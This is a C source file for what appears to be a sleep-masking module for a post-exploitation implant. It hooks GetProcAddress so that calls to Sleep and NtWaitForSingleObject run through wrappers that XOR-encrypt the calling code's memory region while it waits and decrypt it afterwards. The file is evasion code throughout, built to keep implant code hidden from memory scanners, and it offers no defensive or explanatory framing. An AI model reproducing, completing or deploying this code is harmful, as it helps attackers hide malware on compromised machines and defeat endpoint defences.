#include <windows.h>
#include "../tcg.h"

WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

void xor_region(MEMORY_BASIC_INFORMATION *meminfo) {
	dprintf("Performing XOR operation!");
	
	//TODO check memory protection
	
	char *ptr = (char *) meminfo->AllocationBase;
	for(int i = 0; i < meminfo->RegionSize; i++) {
		ptr[i] = ptr[i] ^ 0xAB; // TODO use a long randomly generated key
	}
}

WINBASEAPI VOID WINAPI _Sleep(DWORD dwMilliseconds) {
	void *caller = __builtin_return_address(0);
	
	MEMORY_BASIC_INFORMATION meminfo;
	KERNEL32$VirtualQuery(caller, &meminfo, sizeof(meminfo));
	xor_region(&meminfo);

	KERNEL32$Sleep(dwMilliseconds);
	
	xor_region(&meminfo);
}

WINBASEAPI NTSTATUS NTAPI _NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
	void *caller = __builtin_return_address(0);
	
	MEMORY_BASIC_INFORMATION meminfo;
	KERNEL32$VirtualQuery(caller, &meminfo, sizeof(meminfo));
	xor_region(&meminfo);
	
	NTSTATUS status = NTDLL$NtWaitForSingleObject(Handle, Alertable, Timeout);
	
	xor_region(&meminfo);
	
	return status;
}

LPVOID WINAPI sleepmask(HMODULE hModule, LPCSTR lpProcName) {
	// A function that hooks GetProcAddress() to implement sleep masking.
	
	// lpProcName might be an ordinal, in which case we should leave it alone.
	if ((ULONG_PTR) lpProcName >> 16 == 0) {
		return KERNEL32$GetProcAddress(hModule, lpProcName);
	}
	
	// Use the __resolve_hook() intrinsic, which attempts to resolve lpProcName to a hooked function.
	LPVOID result = __resolve_hook( ror13hash( lpProcName ) );
	if (result != NULL) { return result; }
	
	// If that fails, fall back to the basic GetProcAddress().
	return KERNEL32$GetProcAddress(hModule, lpProcName);
}
